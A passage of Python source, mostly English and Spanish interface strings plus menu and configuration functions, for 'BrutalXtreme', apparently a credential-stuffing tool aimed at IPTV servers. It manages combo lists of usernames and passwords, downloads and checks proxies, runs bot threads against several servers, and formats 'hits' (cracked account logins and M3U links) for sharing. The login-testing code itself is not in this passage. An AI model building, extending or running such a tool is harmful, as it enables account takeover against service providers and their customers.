        "layout_select_title": "LAYOUT CONFIGURATION", "set_default_layout": "Set Default Layout", "set_default_layout_title": "SET DEFAULT LAYOUT", "current_default_indicator": "(Current Default)",
        "prompt_select_new_default": "Enter the number of the layout to set as default (or Enter to cancel):", "default_layout_set_success": "Layout '{}' set as default!",
        "using_default_layout_info": "Using default layout: '{}'", "prompt_use_default_or_choose": "What would you like to do?", "option_use_default": "Use default", "option_choose_another": "Choose another",
        "layout_per_server_q": "You have selected {} servers. Do you want to use a different layout for each one? (Y/N):", "configuring_layout_for": "Configuring layout for server: {}",
        "choose_layout_for_this_server": "» Choose the layout for THIS server:", "layouts_summary_title": "LAYOUTS SUMMARY", "layouts_summary_line": "✔ {} will use layout: '{}'",
        "no_default_layout": "No default layout defined.", "choose_one_for_all_or_each": "Do you want to use a single layout for all servers or a different one for each?",
        "option_one_for_all": "Use a single layout for all", "option_one_for_each": "Choose a layout for each server", "please_choose_layout_for": "Please choose the layout for the scan:",
        "ph_host": "Full server URL (http://server.com:8080)", "ph_porta": "Server port (8080)", "ph_usuario": "Account username", "ph_senha": "Account password", "ph_ip_host": "Server IP address",
        "ph_regiao": "City and country flag of the server", "ph_isp": "Internet Service Provider (hosting)", "ph_status": "Account status (e.g., Online)", "ph_criada_data": "Creation date (YYYY-MM-DD)",
        "ph_criada_completa": "Creation date and time", "ph_expira_data": "Expiration date (YYYY-MM-DD)", "ph_expira_completa": "Expiration date and time", "ph_dias_restantes": "Number of remaining days",
        "ph_conexoes_ativas": "Connections in use", "ph_conexoes_max": "Maximum allowed connections", "ph_canais": "Total number of channels", "ph_filmes": "Total number of movies", "ph_series": "Total number of series",
        "ph_total_vod": "Sum of channels, movies, and series", "ph_conteudo_adulto": "'Yes' or 'No'", "ph_link_m3u": "Complete M3U link", "ph_link_epg": "Complete EPG link",
        "ph_nickname": "Your nickname (set in Scan)", "ph_combo_nome": "Name of the combo used in Scan", "ph_data": "Date of the hit (YYYY-MM-DD)", "ph_hora": "Time of the hit (HH:MM:SS)",
        "press_enter_continue": "Press Enter to continue...", "proxy_downloading": "Downloading {} proxies...", "proxy_source_download": "Downloading from source: {}", "proxy_source_fail": "Failed to download from {}", "proxy_source_found": "Found {} proxies.", "proxy_download_complete": "Proxy download complete. Total of {} unique proxies.", "no_layouts_to_edit": "No layouts to modify.",
        "import_layout_menu": "Import from File (.txt)", "import_layout_title": "IMPORT LAYOUT FROM FILE", "no_import_files": "No .txt files found in {}", "select_import_file": "» Select the file to import:",
        "layout_analysis_title": "--- LAYOUT ANALYSIS '{}' ---", "recognized_placeholders": "✅ Recognized Functions ({}):", "missing_placeholders": "⚠️ Missing Functions (Optional):",
        "invalid_placeholders": "❌ Invalid Functions (Will be ignored):", "preview_error_title": "ERROR: The system could not generate the preview!",
        "preview_error_desc": "This usually happens due to a formatting error in the template (e.g., a spare `}` or `{`).",
        "confirm_save_anyway": "Do you want to save this layout anyway?\nYou can manually correct the template in the layouts.json file later. (Y/N):",
        "layout_import_cancelled": "Layout import cancelled.", "tutorial_title": "LAYOUT CREATION TUTORIAL",
        "tutorial_intro": "The easiest and safest way to add layouts is by creating text files.",
        "tutorial_step1_title": "1. Go to the Import Folder:",
        "tutorial_step1_desc": "Navigate to the 'Brutal/layouts_importar/' folder.",
        "tutorial_step2_title": "2. Create a .txt File:",
        "tutorial_step2_desc": "Create a new text file (e.g., MyCoolLayout.txt). The filename will be your layout's name.",
        "tutorial_step3_title": "3. Assemble and Save Your Layout:",
        "tutorial_step3_desc": "Open the .txt file and paste or write your hit template, using the placeholders from the list below. Save the file.",
        "tutorial_step4_title": "4. Use the Import Option:",
        "tutorial_step4_desc": "In the Layout Manager, use the 'Import from File' option. The system will analyze, preview, and save your layout correctly.",
        "tutorial_conclusion": "This way, you can easily and safely edit your layouts in a text editor, without having to paste into the terminal!",
        "tutorial_example_title": "Practical Example:",
        "tutorial_example_content": "Your `MyLayout.txt` file could have the following content:\n\n🌟 NEW HIT - {nickname} 🌟\n🔗 Server: {host}\n👤 {usuario}:{senha}\n⏳ Expires in: {dias_restantes} days\n\nThe system will understand and replace the `{placeholders}` with the real hit information.",
        "servers_status_title": "======== SERVERS STATUS =========",
        "scan_progress_title": "Scan Progress",
        "progress": "Progress",
        "eta_geral": "Overall ETA",
        "combo_selection_title": "COMBO CONFIGURATION FOR {}",
        "combo_files_found": "Combo files found in {}",
        "combo_select_prompt": "» Enter the file numbers (e.g., 1 or 1,2 to merge):",
        "combos_loaded_and_merged": "{} unique lines loaded and merged.",
        "no_combo_files_found": "No combo files found in {}. Please add .txt files.",
        "use_same_combo_q": "Do you want to use the same combo(s) ('{}') for the server '{}'? (Y/N):",
        "combo_in_use": "Combo(s) in Use....",
        "combo_assembly_title": "--- Combo Assembler for {} ---",
        "current_lines": "Current Lines in Combo: {}",
        "add_from_local": "Add from Local Combos",
        "add_from_online": "Add from Online Combos",
        "finish_combo_assembly": "Finish and Use This Combo",
        "lines_added": "✓ {} lines added.",
        "add_combos_first": "You must add combos before finishing.",
        "theme_menu_intro": "Please choose a visual theme for the interface.",
        "recommended": "Recommended",
        "theme_color_desc": "Vibrant interface with a full color scheme.",
        "theme_bw_desc": "Clean, minimalist interface, ideal for terminals without color support.",
        "enter_choice": "Enter your choice ({} or {}):",
        "setup_complete": "INITIAL SETUP COMPLETE",
        "prefs_saved": "Your preferences have been saved.",
        "program_start": "The program will now start.",
        "status_ok": "OK",
        "status_client_error": "Client Error",
        "status_server_error": "Server Error",
        "status_error": "ERROR"
    },
    "es": {
        "welcome": "Bienvenido a BrutalXtreme", "menu_main": "MENÚ PRINCIPAL", "start_scan": "Iniciar Escaneo", "settings": "Configuraciones", "exit": "Salir", "goodbye": "Saliendo... ¡Hasta la próxima!",
        "settings_title": "CONFIGURACIONES", "change_theme": "Cambiar Tema", "change_language": "Cambiar Idioma", "back": "Volver", "theme_menu": "SELECCIONAR TEMA", "theme_color": "Colorido",
        "theme_bw": "Blanco y Negro", "lang_menu": "SELECCIONAR IDIOMA", "lang_pt": "Portugués", "lang_en": "Inglés", "lang_es": "Español", "config_saved": "¡Configuración guardada correctamente!",
        "theme_change_restart": "¡El cambio de tema tendrá efecto después de reiniciar el programa!", "server_title": "CONFIGURACIÓN DE SERVIDORES", "server_option1": "Ingresar Servidores Manualmente",
        "server_option2": "Cargar desde un Archivo (.txt)", "combo_title": "CONFIGURACIÓN DE COMBO", "proxy_title": "CONFIGURACIÓN DE PROXY", "proxy_question": "¿Desea usar proxy en este escaneo? (s/N): ",
        "proxy_files": "Archivos de proxy locales disponibles:", "proxy_select_file": "» Seleccione archivo: ", "proxy_type_question": "¿Qué TIPO de proxy hay en este archivo?",
        "proxy_check_question": "¿Desea verificar los proxies para usar solo los online? (s/N): ", "ordered_hits_title": "GUARDAR HITS ORDENADOS", "ordered_hits_question": "¿Desea guardar los Hits Ordenados por tiempo de validez?",
        "ordered_hits_warning": "Los resultados se ordenarán por tiempo de expiración y se guardarán en Brutal/Ordenados al finalizar el análisis.", "ordered_hits_option1": "Sí",
        "ordered_hits_option2": "No (Predeterminado)", "ordered_hits_saved_success": "Hits ordenados guardados en:", "ordered_hits_saved_fail": "Error al guardar hits ordenados.",
        "bots_title": "CONFIGURACIÓN DE BOTS", "bots_question": "» Bots POR SERVIDOR (predeterminado: 15): ", "scan_summary": "=============== RESUMEN FINAL ===============", "scan_duration": "Duración Total...: {}",
        "scan_combo": "Combo(s).........: {}", "scan_tested": "Líneas Probadas.: {}", "scan_hits": "Aciertos Totales: {}", "scan_bads": "Malos............: {}", "scan_errors": "Errores de Red...: {}",
        "scan_hits_per_server": "--- ACIERTOS POR SERVIDOR ---", "scan_hits_server": "{}: {} aciertos", "scan_hits_saved": "Escaneo completado. Aciertos guardados en:\n{}", "combo_hits_saved": "Combo de aciertos actualizado guardado en: {}",
        "aborted": "Configuración abortada.", "cancelled": "Operación cancelada por el usuario.", "restart_question": "¿Desea iniciar un nuevo escaneo? (s/N): ", "nickname_question": "» Ingrese su Nickname (predeterminado: {}):\n ",
        "days": "Días", "active": "En línea", "inactive": "Inactivo", "na": "N/A", "unlimited": "Ilimitado", "adult_yes": "Sí", "adult_no": "No", "adult_na": "N/A", "connection_status": "Estado de Conexión",
        "waiting": "Esperando...", "last_test": "Última Prueba", "proxy_checking": "Verificando Proxies en Línea", "proxy_checked": "Verificados: {}/{} ({}%)", "proxy_online_found": "Encontrados Online: {}",
        "proxy_bots": "Bots de Verificación: 100", "proxy_check_complete": "Verificación completada. {} de {} proxies únicos están online.", "proxy_no_files": "¡No se encontraron archivos de servidor en {}!",
        "proxy_invalid_type": "Tipo de proxy inválido.", "proxy_file_error": "Error al leer archivo: {}", "proxy_invalid_selection": "Selección de archivo inválida.", "combo_downloading": "Espere, descargando combo online...",
        "combo_downloading_wait": "Descargando...", "combo_download_fail": "✗ Fallo en la Conexión: {}", "combo_download_success": "✓ ¡Combo Online Cargado Exitosamente!", "combo_total_accounts": "Total de Cuentas: {}",
        "combo_http_error": "✗ Error HTTP {} al descargar el combo online.", "combo_invalid_url": "URL inválida.", "invalid_option": "Opción inválida.", "combo_empty": "El combo está vacío o no se encontraron líneas válidas.",
        "combo_read_error": "Error al leer archivo: {}", "invalid_selection": "Selección inválida.", "combo_loaded": "{} líneas cargadas de {}", "combo_online_failed": "La URL del combo online falló.",
        "server_manual_instruction": "\nIngrese hasta 5 servidores (ej: http://dominio.com:8080). Deje en blanco para finalizar.", "server_prompt": "Servidor {}: ", "server_checking": "Verificando {}...",
        "server_online_added": "✅ Servidor Online.", "server_offline": "⚠️ Servidor OFFLINE (Agregado de todos modos).", "server_no_files_prompt": "Presione Enter para volver...", "server_files_available": "\nArchivos de servidor disponibles:",
        "server_select_max": "\nServidores encontrados en el archivo. Seleccione hasta 5 para el escaneo.", "server_select_indices": "» Ingrese los números de los servidores (ej: 1,3,5): ",
        "server_max_warning": "Solo puede seleccionar máximo 5 servidores. Usando los primeros 5.", "server_verifying": "\nVerificando servidores seleccionados...", "server_online": "✅ {} - Online",
        "server_offline_server": "❌ {} - Offline", "server_online_count": "\n{} servidores online añadidos.", "server_none_valid": "No se configuraron servidores válidos. Abortando.",
        "nickname": "Nickname", "combos_plural_label": "Combo(s)", "proxy": "Proxy", "proxy_ip": "IP del Proxy", "tested": "Probados", "speed": "Velocidad", "time": "Tiempo", "hits": "Aciertos", "bads": "Malos", "errors": "Errores",
        "bots": "Bots", "servers": "Servidores", "scan_interrupted": "\nSaliendo del escaneo a petición del usuario...", "scan_finishing": "\nFinalizando escaneo... Esperando que los hilos terminen.",
        "bots_invalid": "El número de bots debe ser mayor que cero.", "proxy_online_option": "Proxies en Línea (Descargar de Internet)", "proxy_local_option": "Proxies Locales (Cargar desde Archivo)",
        "proxy_no_use_option": "No Usar Proxy", "proxy_online_title": "PROXIES EN LÍNEA", "proxy_online_prompt": "¿Qué tipo de proxy en línea desea descargar?", "manage_online_combos": "GESTIONAR COMBOS ONLINE",
        "no_combos_saved": "No hay combos online guardados.", "saved_combos": "Combos Guardados:", "add_new_combo": "Añadir Nuevo Combo", "rename_combo": "Renombrar un Combo",
        "delete_combo": "Eliminar un Combo", "prompt_combo_name": "Ingrese un nombre para el combo:", "prompt_combo_url": "Ingrese la URL del combo:", "combo_saved_success": "¡Combo '{}' guardado con éxito!",
        "invalid_name_url": "Nombre o URL no válidos. El combo no fue guardado.", "no_combos_rename": "No hay combos para renombrar.", "prompt_rename_which": "Ingrese el número del combo para renombrar:",
        "prompt_new_name": "Ingrese el nuevo nombre para '{}':", "combo_renamed_success": "¡Combo renombrado con éxito!", "name_not_empty": "El nombre no puede estar vacío.", "invalid_input": "Entrada no válida.",
        "no_combos_delete": "No hay combos para eliminar.", "prompt_delete_which": "Ingrese el número del combo para eliminar:", "combo_deleted_success": "¡Combo '{}' eliminado con éxito!",
        "insert_temp_url": "Insertar una URL temporal", "online_saved_section": "Combos Online Guardados", "local_combos_section": "Combos Locales (de la carpeta /combo/)",
        "other_online_options": "Otras Opciones Online", "back_to_main_menu": "Volver al menú principal", "combo_online_default": "Combo Online Predeterminado (Recomendado)",
        "combo_type_title": "ELIJA EL TIPO DE COMBO", "online_combos_menu": "Combos Online", "local_combos_menu": "Combos Locales (Carpeta: {})", "manage_layouts": "Gestionar Diseños de Hits",
        "layout_manager_title": "GESTOR DE DISEÑOS", "rename_layout": "Renombrar un Diseño", "delete_layout": "Eliminar un Diseño",
        "layout_saved_success": "¡Diseño '{}' guardado con éxito!",
        "layout_deleted_success": "¡Diseño '{}' eliminado con éxito!", "layout_renamed_success": "¡Diseño renombrado con éxito!",
        "layout_preview_title": "--- VISTA PREVIA DEL HIT ---", "layout_confirm_correct": "¿La plantilla es correcta y está lista para guardar? (S/N):",
        "placeholders_help_title": "--- MARCADORES DE POSICIÓN DISPONIBLES ---",
        "layout_model_empty": "El modelo no puede estar vacío.",
        "layout_select_title": "CONFIGURACIÓN DE DISEÑO", "set_default_layout": "Establecer Diseño Predeterminado", "set_default_layout_title": "ESTABLECER DISEÑO PREDETERMINADO", "current_default_indicator": "(Predeterminado Actual)",
        "prompt_select_new_default": "Ingrese el número del diseño para establecer como predeterminado (o Enter para cancelar):", "default_layout_set_success": "¡Diseño '{}' establecido como predeterminado!",
        "using_default_layout_info": "Usando diseño predeterminado: '{}'", "prompt_use_default_or_choose": "¿Qué le gustaría hacer?", "option_use_default": "Usar el predeterminado", "option_choose_another": "Elegir otro",
        "layout_per_server_q": "Ha seleccionado {} servidores. ¿Desea utilizar un diseño diferente para cada uno? (S/N):", "configuring_layout_for": "Configurando diseño para el servidor: {}",
        "choose_layout_for_this_server": "» Elija el diseño para ESTE servidor:", "layouts_summary_title": "RESUMEN DE DISEÑOS", "layouts_summary_line": "✔ {} usará el diseño: '{}'",
        "no_default_layout": "No se ha definido ningún diseño predeterminado.", "choose_one_for_all_or_each": "¿Desea utilizar un único diseño para todos los servidores o uno diferente para cada uno?",
        "option_one_for_all": "Usar un único diseño para todos", "option_one_for_each": "Elegir un diseño para cada servidor", "please_choose_layout_for": "Por favor, elija el diseño que se utilizará para el escaneo:",
        "ph_host": "URL completa del servidor (http://servidor.com:8080)", "ph_porta": "Puerto del servidor (8080)", "ph_usuario": "Nombre de usuario de la cuenta", "ph_senha": "Contraseña de la cuenta", "ph_ip_host": "Dirección IP del servidor",
        "ph_regiao": "Ciudad y bandera del país del servidor", "ph_isp": "Proveedor de Internet (alojamiento)", "ph_status": "Estado de la cuenta (ej: Online)", "ph_criada_data": "Fecha de creación (DD/MM/AAAA)",
        "ph_criada_completa": "Fecha y hora de creación", "ph_expira_data": "Fecha de expiración (DD/MM/AAAA)", "ph_expira_completa": "Fecha y hora de expiración", "ph_dias_restantes": "Número de días restantes",
        "ph_conexoes_ativas": "Conexiones en uso", "ph_conexoes_max": "Máximo de conexiones permitidas", "ph_canais": "Número total de canales", "ph_filmes": "Número total de películas", "ph_series": "Número total de series",
        "ph_total_vod": "Suma de canales, películas y series", "ph_conteudo_adulto": "'Sí' o 'No'", "ph_link_m3u": "Enlace M3U completo", "ph_link_epg": "Enlace EPG completo",
        "ph_nickname": "Su apodo (configurado en el Escaneo)", "ph_combo_nome": "Nombre del combo utilizado en el Escaneo", "ph_data": "Fecha del hit (DD/MM/AAAA)", "ph_hora": "Hora del hit (HH:MM:SS)",
        "press_enter_continue": "Pulse Enter para continuar...", "proxy_downloading": "Descargando proxies {}...", "proxy_source_download": "Descargando de la fuente: {}", "proxy_source_fail": "Fallo al descargar de {}", "proxy_source_found": "Encontrados {} proxies.", "proxy_download_complete": "Descarga de proxies completa. Total de {} proxies únicos.", "no_layouts_to_edit": "No hay diseños para modificar.",
        "import_layout_menu": "Importar desde Archivo (.txt)", "import_layout_title": "IMPORTAR DISEÑO DESDE ARCHIVO", "no_import_files": "No se encontraron archivos .txt en {}", "select_import_file": "» Seleccione el archivo a importar:",
        "layout_analysis_title": "--- ANÁLISIS DEL DISEÑO '{}' ---", "recognized_placeholders": "✅ Funciones Reconocidas ({}):", "missing_placeholders": "⚠️ Funciones Faltantes (Opcionales):",
        "invalid_placeholders": "❌ Funciones Inválidas (Serán ignoradas):", "preview_error_title": "¡ERROR: El sistema no pudo generar la vista previa!",
        "preview_error_desc": "Esto suele ocurrir por un error de formato en la plantilla (ej: una llave `}` o `{` suelta).",
        "confirm_save_anyway": "¿Desea guardar este diseño de todos modos?\nPuede corregir la plantilla manualmente en el archivo layouts.json más tarde. (S/N):",
        "layout_import_cancelled": "Importación de diseño cancelada.", "tutorial_title": "TUTORIAL DE CREACIÓN DE DISEÑOS",
        "tutorial_intro": "La forma más fácil y segura de añadir diseños es creando archivos de texto.",
        "tutorial_step1_title": "1. Vaya a la Carpeta de Importación:",
        "tutorial_step1_desc": "Navegue a la carpeta 'Brutal/layouts_importar/'.",
        "tutorial_step2_title": "2. Cree un Archivo .txt:",
        "tutorial_step2_desc": "Cree un nuevo archivo de texto (ej: MiDiseñoGenial.txt). El nombre del archivo será el nombre de su diseño.",
        "tutorial_step3_title": "3. Ensamble y Guarde su Diseño:",
        "tutorial_step3_desc": "Abra el archivo .txt y pegue o escriba su plantilla de hit, usando los marcadores de posición de la lista de abajo. Guarde el archivo.",
        "tutorial_step4_title": "4. Use la Opción de Importar:",
        "tutorial_step4_desc": "En el Gestor de Diseños, use la opción 'Importar desde Archivo'. El sistema analizará, previsualizará y guardará su diseño correctamente.",
        "tutorial_conclusion": "¡De esta manera, puede editar sus diseños fácil y seguramente en un editor de texto, sin necesidad de pegar en la terminal!",
        "tutorial_example_title": "Ejemplo Práctico:",
        "tutorial_example_content": "Su archivo `MiLayout.txt` podría tener el siguiente contenido:\n\n🌟 NUEVO HIT - {nickname} 🌟\n🔗 Servidor: {host}\n👤 {usuario}:{senha}\n⏳ Expira en: {dias_restantes} días\n\nEl sistema entenderá y reemplazará los `{placeholders}` con la información real del hit.",
        "servers_status_title": "======= ESTADO DE LOS SERVIDORES =======",
        "scan_progress_title": "Progreso del Escaneo",
        "progress": "Progreso",
        "eta_geral": "ETA General",
        "combo_selection_title": "CONFIGURACIÓN DE COMBO PARA {}",
        "combo_files_found": "Archivos de combo encontrados en {}",
        "combo_select_prompt": "» Ingrese los números de archivo (ej: 1 o 1,2 para fusionar):",
        "combos_loaded_and_merged": "{} líneas únicas cargadas y fusionadas.",
        "no_combo_files_found": "No se encontraron archivos de combo en la carpeta {}. Por favor, agregue archivos .txt.",
        "use_same_combo_q": "¿Desea utilizar los mismos combos ('{}') para este servidor '{}'? (S/N):",
        "combo_in_use": "Combo(s) en Uso....",
        "combo_assembly_title": "--- Ensamblador de Combo para {} ---",
        "current_lines": "Líneas Actuales en el Combo: {}",
        "add_from_local": "Añadir desde Combos Locales",
        "add_from_online": "Añadir desde Combos Online",
        "finish_combo_assembly": "Finalizar y Usar Este Combo",
        "lines_added": "✓ {} líneas añadidas.",
        "add_combos_first": "Debes añadir combos antes de finalizar.",
        "theme_menu_intro": "Por favor, elija un tema visual para la interfaz.",
        "recommended": "Recomendado",
        "theme_color_desc": "Interfaz vibrante con un esquema de color completo.",
        "theme_bw_desc": "Interfaz limpia y minimalista, ideal para terminales sin soporte de color.",
        "enter_choice": "Ingrese su opción ({} o {}):",
        "setup_complete": "CONFIGURACIÓN INICIAL COMPLETA",
        "prefs_saved": "Sus preferencias han sido guardadas.",
        "program_start": "El programa se iniciará ahora.",
        "status_ok": "OK",
        "status_client_error": "Error del Cliente",
        "status_server_error": "Error del Servidor",
        "status_error": "ERROR"
    },
}
def tr(key, *args):
    lang = CONFIG.get("language", "pt")
    lang_dict = TRANSLATIONS.get(lang, TRANSLATIONS.get("en", {}))
    translation = lang_dict.get(key, TRANSLATIONS.get("en", {}).get(key, key))
    try:
        if args: return translation.format(*args)
    except (IndexError, KeyError): return translation
    return translation
def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except (json.JSONDecodeError, IOError):
        if os.path.exists(CONFIG_FILE): os.remove(CONFIG_FILE)
    return None
def save_config(config_data):
    global CONFIG
    try:
        os.makedirs(BRUTAL_DIR, exist_ok=True)
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config_data, f, indent=4)
        CONFIG = config_data
    except IOError as e: print(f"Erro ao salvar a configuração: {e}")
def init_theme():
    global c
    if CONFIG.get("theme") == "bw":
        c = lambda color_name: ""
        return
    try:
        from colorama import Fore, Style, init
        init(autoreset=True)
        PALETA_COLORIDA = {
            'RESET': Style.RESET_ALL, 'BOLD': Style.BRIGHT, 'DIM': Style.DIM, 'RED': Fore.RED, 'LARANJA': '\033[38;5;208m', 'AMARELO_OURO': '\033[38;5;220m',
            'VERDE_LIMAO': '\033[38;5;118m', 'VERDE_ESMERALDA': '\033[38;5;40m', 'CIANO': '\033[38;5;51m', 'AZUL_CELESTE': '\033[38;5;39m',
            'AZUL_ROYAL': '\033[38;5;21m', 'VIOLETA': '\033[38;5;135m', 'MAGENTA': '\033[38;5;201m', 'BRANCO': Fore.WHITE, 'CINZA_MEDIO': '\033[38;5;244m',
        }
    except ImportError: PALETA_COLORIDA = defaultdict(str)
    def color_func(color_name): return PALETA_COLORIDA.get(color_name.upper(), "")
    c = color_func
def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def print_banner():
    laranja = "\033[38;5;208m"       
    amarelo_ouro = "\033[1;33m"      
    cinza_medio = "\033[0;37m"       
    reset = "\033[0m"                

    banner_template = f"""{laranja}          ___          _        _ 
         | _ )_ _ _  _| |_ __ _| |
         | _ \\ '_| || |  _/ _` | |
         |___/_|  \\_,_|\\__\\__,_|_|                 
{amarelo_ouro}        __ ___                     
        \\ \\/ / |_ _ _ ___ _ __  ___ 
         >  <|  _| '_/ -_) '  \\/ -_)
        /_/\\_\\\\__|_| \\___|_|_|_\\___| 
{cinza_medio}   ☛ᴅᴇsᴇɴᴠᴏʟᴠɪᴅᴏ ᴘᴇʟᴏ ɢʀᴜᴘᴏ sᴏ ᴏs ᴛᴏᴘ ɪᴘᴛᴠ☚
        ☛ ᴄʀᴇᴅɪᴛᴏs ᴋᴀᴋᴀsʜɪ нαταкє ☚{reset}"""
    banner = banner_template.format(
        laranja=c('LARANJA'), amarelo_ouro=c('AMARELO_OURO'), cinza_medio=c('CINZA_MEDIO'), reset=c('RESET')
    )
    print(banner)
def first_time_setup():
    temp_config = {}
    clear()
    print("   ══════════ 𝗕𝗥𝗨𝗧𝗔𝗟 𝗫𝗧𝗥𝗘𝗠𝗘 ═════════\n\n       Bem-vindo! / Welcome! / ¡Bienvenido!\n    [1] 🇧🇷 Português\n    [2] 🇺🇸 English\n    [3] 🇪🇸 Español")
    lang_choice = ''
    while lang_choice not in ['1', '2', '3']: lang_choice = input("    Digite o número do seu idioma / Enter the number for your language / Ingrese el número de su idioma:\n    » ").strip()
    lang_map = {'1': 'pt', '2': 'en', '3': 'es'}; temp_config['language'] = lang_map[lang_choice]; CONFIG['language'] = temp_config['language']
    clear(); print_banner()
    print(f"\n{c('LARANJA')}  --- {c('BOLD')}{tr('welcome')} --- \n{c('RESET')}"); print(f"{tr('theme_menu_intro')}\n"); print(f"[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('theme_color')} ({tr('recommended')})"); print(f"    - {tr('theme_color_desc')}"); print(f"\n[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('theme_bw')}"); print(f"    - {tr('theme_bw_desc')}")
    theme_choice = ''
    while theme_choice not in ['1', '2']: theme_choice = input(f"\n{tr('enter_choice', '1', '2')}\n» ").strip()
    temp_config['theme'] = 'color' if theme_choice == '1' else 'bw'; temp_config['nickname'] = "Brutal"; temp_config['online_combos'] = []
    temp_config['default_layout'] = ""
    clear(); print_banner()
    print(f"\n{c('VERDE_ESMERALDA')}--- {c('BOLD')}{tr('setup_complete')} ---{c('RESET')}\n"); lang_key = f"lang_{temp_config['language']}"; theme_key = f"theme_{temp_config['theme']}"
    print(f"{tr('language')}: {tr(lang_key)}"); print(f"{tr('theme')}: {tr(theme_key)}"); print(f"\n{tr('prefs_saved')}"); print(f"{tr('program_start')}")
    save_config(temp_config); input(f"\n{tr('press_enter_continue')}")
def load_layouts():
    if not os.path.exists(LAYOUTS_FILE): create_default_layouts_if_not_exists()
    try:
        with open(LAYOUTS_FILE, 'r', encoding='utf-8') as f: return json.load(f).get("layouts", [])
    except (json.JSONDecodeError, IOError): return DEFAULT_LAYOUTS["layouts"]
def save_layouts(layouts_data):
    try:
        with open(LAYOUTS_FILE, 'w', encoding='utf-8') as f: json.dump({"layouts": layouts_data}, f, indent=2, ensure_ascii=False)
    except IOError as e: print(f"{c('RED')}Erro ao salvar layouts: {e}{c('RESET')}")
def create_default_layouts_if_not_exists():
    if not os.path.exists(LAYOUTS_FILE): save_layouts(DEFAULT_LAYOUTS["layouts"])
def change_theme():
    while True:
        clear(); print_banner()
        print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('theme_menu')} ---{c('RESET')}"); print(f"[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('theme_color')}"); print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('theme_bw')}"); print(f"[{c('VERDE_LIMAO')}3{c('RESET')}] {tr('back')}")
        choice = input(f"{c('LARANJA')}» {c('RESET')}").strip()
        if choice == "1": CONFIG["theme"] = "color"; save_config(CONFIG); print(f"\n{c('VERDE_ESMERALDA')}{tr('config_saved')}{c('RESET')}"); print(f"{c('AMARELO_OURO')}{tr('theme_change_restart')}{c('RESET')}"); time.sleep(2); return
        elif choice == "2": CONFIG["theme"] = "bw"; save_config(CONFIG); print(f"\n{c('VERDE_ESMERALDA')}{tr('config_saved')}{c('RESET')}"); print(f"{c('AMARELO_OURO')}{tr('theme_change_restart')}{c('RESET')}"); time.sleep(2); return
        elif choice == "3": return
def change_language():
    while True:
        clear(); print_banner()
        print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('lang_menu')} ---{c('RESET')}"); print(f"[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('lang_pt')}"); print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('lang_en')}"); print(f"[{c('VERDE_LIMAO')}3{c('RESET')}] {tr('lang_es')}"); print(f"[{c('VERDE_LIMAO')}4{c('RESET')}] {tr('back')}")
        choice = input(f"{c('LARANJA')}» {c('RESET')}").strip()
        if choice == "1": CONFIG["language"] = "pt"; save_config(CONFIG); print(f"\n{c('VERDE_ESMERALDA')}{tr('config_saved')}{c('RESET')}"); time.sleep(1); return
        elif choice == "2": CONFIG["language"] = "en"; save_config(CONFIG); print(f"\n{c('VERDE_ESMERALDA')}{tr('config_saved')}{c('RESET')}"); time.sleep(1); return
        elif choice == "3": CONFIG["language"] = "es"; save_config(CONFIG); print(f"\n{c('VERDE_ESMERALDA')}{tr('config_saved')}{c('RESET')}"); time.sleep(1); return
        elif choice == "4": return
def settings_menu():
    while True:
        clear(); print_banner()
        print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('settings_title')} ---{c('RESET')}"); print(f"[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('change_language')}"); print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('change_theme')}"); print(f"[{c('VERDE_LIMAO')}3{c('RESET')}] {tr('manage_online_combos')}"); print(f"[{c('VERDE_LIMAO')}4{c('RESET')}] {tr('manage_layouts')}"); print(f"[{c('VERDE_LIMAO')}5{c('RESET')}] {tr('back')}")
        choice = input(f"{c('LARANJA')}» {c('RESET')}").strip()
        if choice == "1": change_language()
        elif choice == "2": change_theme()
        elif choice == "3": manage_online_combos_menu()
        elif choice == "4": manage_layouts_menu()
        elif choice == "5": return
def manage_online_combos_menu():
    while True:
        clear(); print_banner()
        print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('manage_online_combos')}{c('RESET')} ---")
        online_combos = CONFIG.get("online_combos", [])
        if not online_combos: print(f"\n{c('AMARELO_OURO')}{tr('no_combos_saved')}{c('RESET')}")
        else:
            print(f"\n{c('CIANO')}{tr('saved_combos')}{c('RESET')}")
            for i, combo in enumerate(online_combos, 1):
                url_display = combo['url'][:50] + '...' if len(combo['url']) > 50 else combo['url']
                print(f"  [{c('VERDE_LIMAO')}{i}{c('RESET')}] {c('BOLD')}{combo['name']}{c('RESET')} - {c('CINZA_MEDIO')}{url_display}{c('RESET')}")
        print("\n" + "="*30); print(f"[{c('VERDE_LIMAO')}A{c('RESET')}] {tr('add_new_combo')}"); print(f"[{c('VERDE_LIMAO')}R{c('RESET')}] {tr('rename_combo')}"); print(f"[{c('VERDE_LIMAO')}E{c('RESET')}] {tr('delete_combo')}"); print(f"[{c('VERDE_LIMAO')}V{c('RESET')}] {tr('back')}")
        choice = input(f"{c('LARANJA')}» {c('RESET')}").strip().upper()
        if choice == 'A': add_online_combo()
        elif choice == 'R': rename_online_combo()
        elif choice == 'E': delete_online_combo()
        elif choice == 'V': return
def add_online_combo():
    name = input(f"\n{c('AZUL_CELESTE')}{tr('prompt_combo_name')} {c('RESET')}").strip()
    url = input(f"{c('AZUL_CELESTE')}{tr('prompt_combo_url')} {c('RESET')}").strip()
    if name and url.startswith(('http://', 'https://')):
        CONFIG.setdefault("online_combos", []).append({"name": name, "url": url})
        save_config(CONFIG)
        print(f"\n{c('VERDE_ESMERALDA')}{tr('combo_saved_success', name)}{c('RESET')}")
    else: print(f"\n{c('RED')}{tr('invalid_name_url')}{c('RESET')}")
    time.sleep(2)
def rename_online_combo():
    online_combos = CONFIG.get("online_combos", [])
    if not online_combos: print(f"\n{c('RED')}{tr('no_combos_rename')}{c('RESET')}"); time.sleep(2); return
    try:
